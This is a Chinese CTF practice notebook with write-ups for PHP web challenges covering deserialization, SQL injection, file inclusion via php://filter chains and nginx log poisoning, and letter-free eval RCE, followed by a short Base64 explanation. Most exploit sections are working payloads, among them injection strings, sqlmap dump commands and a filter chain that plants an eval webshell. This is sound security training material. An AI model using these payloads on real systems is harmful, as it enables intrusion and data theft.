# 刷题记录

## PHP序列化

### 1.CTF秀单身杯

```php
#考点：反序列化 MD5绕过

题干：
<?php
    error_reporting(0);
    highlight_file(__FILE__);

    class ctfshow {
        private $d = '';
        private $s = '';
        private $b = '';
        private $ctf = '';

        public function __destruct() {
            $this->d = (string)$this->d;
            $this->s = (string)$this->s;
            $this->b = (string)$this->b;

            if (($this->d != $this->s) && ($this->d != $this->b) && ($this->s != $this->b)) {
                $dsb = $this->d.$this->s.$this->b;

                if ((strlen($dsb) <= 3) && (strlen($this->ctf) <= 3)) {
                    if (($dsb !== $this->ctf) && ($this->ctf !== $dsb)) {
                        if (md5($dsb) === md5($this->ctf)) {
                            echo file_get_contents("/flag.txt");
                        }
                    }
                }
            }
        }
    }

    unserialize($_GET["dsbctf"]); 
```

```
wp：
    题干要求$d$b$s互不相等且为字符型 $dsb$ctf长度小于等于3且互不相等 md5加密后的$dsb与$ctf相同
    使用php中浮点常量INF构造payload
    URL编码中 %3A表示：%22表示" %3B表示; %00用于反序列化私有属性 %7D表示} %7B表示{
   /?dsbctf=O%3A7%3A%22ctfshow%22%3A4%3A%7Bs%3A10%3A%22%00ctfshow%00d%22%3Bs%3A1%3A%22I%22%3Bs%3A10%3A%22%00ctfshow%00s%22%3Bs%3A1%3A%22N%22%3Bs%3A10%3A%22%00ctfshow%00b%22%3Bs%3A1%3A%22F%22%3Bs%3A12%3A%22%00ctfshow%00ctf%22%3Bd%3AINF%3B%7D
```



## SQL注入

### 1.CTF秀web2

```
方法一：手注
1.观察发现注入点为登录框POST请求
2.构造payload 
	/?username=a' or 1#    --产生回显
	/?username=a' or 1 order by 3#    --超度超过4没有回显 说明回显了三个字段
	/?username=a' or 1 union select 1,2,3#    --回显三个字段
	/?username=a' or 1 union select 1,database(),3#    --爆库web2
	/?username=a' or '1' union select 1,group_concat(table_name),3 from information_schema.tables where 	table_schema=database()#	--爆表flag，user
	/?username=a' or '1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'#    --爆列flag
	/?username=a' or '1' union select 1,group_concat(flag),3 from flag#    --爆字段
	
方法二：SQLMAP：
sqlmap -r xxx --level=3 --risk=3 --dbs    --爆库
sqlmap -r xxx --level=3 --risk=3 -D web2(库名) --dump flag    --爆字段
```



## PHP伪协议/文件包含



### 基础

https://segmentfault.com/a/1190000018991087



### 绕过(文件包含RCE)

```
FilterChain：
参考文章：https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH
		https://blog.csdn.net/m0_73512445/article/details/134627841
脚本：https://github.com/synacktiv/php_filter_chain_generator
使用方法：cd进目录打开cmd 
		python .\php_filter_chain_generator.py --chain "xxx"
```

```
[+] The following gadget chain will generate the following code : <?php phpinfo();?> (base64 value: PD9waHAgcGhwaW5mbygpOz8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

```
[+] The following gadget chain will generate the following code : <?php @eval($_POST[hack]);?> (base64 value: PD9waHAgQGV2YWwoJF9QT1NUW2hhY2tdKTs/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```



### 1.CTF秀web3

```php
题干：<?php include($_GET['url']);?>

源码：
<?php
error_reporting(0);
$url=$_GET['url'];
if(isset($url)){
    include($url);
}
```

```
wp:
1.观察发现是文件包含漏洞   
2.构造payload
方法一：php://input运用
	1./?url=php://input 浏览器抓包重放改POST 请求体写入<?php system("ls");?>    --回显ctf_go_go_go index
	2./?url=php://input 浏览器抓包重放改POST 请求体写入<?php system("cat ctf_go_go_go");?>
	  或者/?url=php://filter/resource=ctf_go_go_go    --读取该文件内容
方法二：Nginx日志文件包含
	发送请求 将UA头改成木马
	蚁剑访问请求路径+?url=/var/log/nginx/access.log
```



### 2.NSSCTF include

```php
#考点：php://filiter读取文件

题干：
<?php
ini_set("allow_url_include","on");
header("Content-type: text/html; charset=utf-8");
error_reporting(0);
$file=$_GET['file'];
if(isset($file)){
    show_source(__FILE__);
    echo 'flag 在flag.php中';
}else{
    echo "传入一个file试试";
}
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
include_once($file);
?> flag 在flag.php中
```

```
wp:
1.观察发现是文件包含漏洞 flag在flag.php文件中
2.构造payload
	/?file=php://filter/convert.base64-encode/resource=flag.php    --获得BASE64加密后的flag
```

FAQs：1.为什么要使用convert.base64-encode而不是直接php://filter/resource读取flag？

答：flag是在flag.php文件之中，当使用include这样的函数时php会尝试执行该文件中的代码而不是输出。Base64 编码可以确保文件内容被编码成字符串形式输出，而不是被执行。

2.为什么使用php://input【POST】无法执行命令？

答：根据过滤链构造phpinfo()发现配置文件中allow_url_include状态为false。



### 3.NSS [HXPCTF 2021]includer‘s revenge

```php
#考点：nginx条件竞争 filiter链(非预期)

题干：
<?php ($_GET['action'] ?? 'read' ) === 'read' ? readfile($_GET['file'] ?? 'index.php') : include_once($_GET['file'] ?? 'index.php');?>

wp:
https://tttang.com/archive/1384/#toc_0x02-includers-revenge-nginx-fastcgi-temp-lfi
https://blog.csdn.net/Jayjay___/article/details/133253934
```

```dockerfile
# Running locally:
# 1) echo 'hxp{FLAG}' > flag.txt
# 2) docker build -t includers_revenge .
# 3) docker run -p 8088:80 --rm -it includers_revenge

FROM debian:bullseye

RUN DEBIAN_FRONTEND=noninteractive apt-get update && \
    apt-get install -y \
        nginx \
        php-fpm \
    && rm -rf /var/lib/apt/lists/

RUN rm -rf /var/www/html/*
COPY docker-stuff/default /etc/nginx/sites-enabled/default
COPY docker-stuff/www.conf /etc/php/7.4/fpm/pool.d/www.conf

#  # Permission
#  7 rwx
#  6 rw-
#  5 r-x
#  4 r--
#  3 -wx
#  2 -w-
#  1 --x
#  0 ---

COPY flag.txt docker-stuff/readflag /
RUN chown 0:1337 /flag.txt /readflag && \
    chmod 040 /flag.txt && \
    chmod 2555 /readflag

COPY index.php /var/www/html/

#递归地将/var/www目录及其所有子目录和文件的所有者和组更改为root用户
RUN chown -R root:root /var/www && \
	#找到/var/www下所有目录执行chomd555--有读取和执行的权限，但没有写入的权限
    find /var/www -type d -exec chmod 555 {} \; && \
    #类似地，将每个文件设置成444权限--只读权限
    find /var/www -type f -exec chmod 444 {} \; && \
    #更改临时文件夹和PHP会话存储的位置所有权交给root用户
    chown -R root:root /tmp /var/tmp /var/lib/php/sessions && \
    #将权限设置成000--完全禁止访问
    chmod -R 000 /tmp /var/tmp /var/lib/php/sessions

#重定向日志输出
RUN ln -sf /dev/stdout /var/log/nginx/access.log && \
    ln -sf /dev/stderr /var/log/nginx/error.log

RUN find / -ignore_readdir_race -type f \( -perm -4000 -o -perm -2000 \) -not -wholename /readflag -delete
USER www-data
RUN (find --version && id --version && sed --version && grep --version) > /dev/null
RUN ! find / -writable -or -user $(id -un) -or -group $(id -Gn|sed -e 's/ / -or -group /g') 2> /dev/null | grep -Ev -m 1 '^(/dev/|/run/|/proc/|/sys/|/var/lock|/var/log/nginx/error.log|/var/log/nginx/access.log)'
USER root

EXPOSE 80
CMD /etc/init.d/php7.4-fpm start && \
    nginx -g 'daemon off;'

```



## 条件竞争/Session文件包含

### 基础

https://blog.csdn.net/m0_56019217/article/details/143443028



## RCE

### 1.CTF秀 shellme_Revenge 

```
#考点：使用非字母数字形式实现RCE

wp:
https://blog.csdn.net/weixin_46270220/article/details/119740439
1.首页页面为phpinfo()文件 浏览器发现cookie键为?looklook 访问
2.显示代码如下
```

```php
 <?php
error_reporting(0);
if ($_GET['looklook']){
    highlight_file(__FILE__);
}else{
    setcookie("hint", "?looklook", time()+3600);
}
if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    if (is_string($ctfshow) || strlen($ctfshow) <= 107) {
        if (!preg_match("/[!@#%^&*:'\"|`a-zA-BD-Z~\\\\]|[4-9]/",$ctfshow)){
            eval($ctfshow);
        }else{
            echo("fucccc hacker!!");
        }
    }
} else {

    phpinfo();
}
?> 
```

```php
3.可以看到字母和数字中没被过滤的只剩C和0-3，就用这几个来构造payload
<?php
$_=C;
$_++; //D
$C=++$_; //E
$_++; //F
$C_=++$_; //G
$_=(C/C.C){0}; //N
$_++; //O
$_++; //P
$_++; //Q
$_++; //R
$_++; //S
$_=_.$C_.$C.++$_; //_GET
($$_{1})($$_{2}); //($_GET{1})($_GET{2})

4.构造payload
?looklook=1&1=passthru&2=cat /flag.txt       		       ctf_show=%24_%3DC%3B%24_%2B%2B%3B%24C%3D%2B%2B%24_%3B%24_%2B%2B%3B%24C_%3D%2B%2B%24_%3B%24_%3D(C%2FC.C)%7B0%7D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D_.%24C_.%24C.%2B%2B%24_%3B(%24%24_%7B1%7D)(%24%24_%7B2%7D)%3B%20

```



## PWN

### 基础

#### a.BASE64编码

Base64编码将任意二进制数据转换成只包含A-Z, a-z, 0-9, '+' 和 '/' 的ASCII字符串，并使用'='作为填充字符。

```
第一步：将字符串转换成字节数组（ASCII编码或UTF-8编码）
第二步：将每个字符的字节值转为二进制（每个字符用8个二进制位表示）
第三步：将二进制数据组合按每三个字节一组分组 对于最后一组不足三字节部分用0填充
第四步：将这些24位块拆分为6位的子集
第五步：映射 全为0的6位填充为=
```

FAQs：为什么BASE64不叫BASE32或者BASE128？

答：因为64指的是64中字符表示，也存在BASE32 BASE128 但不常用。
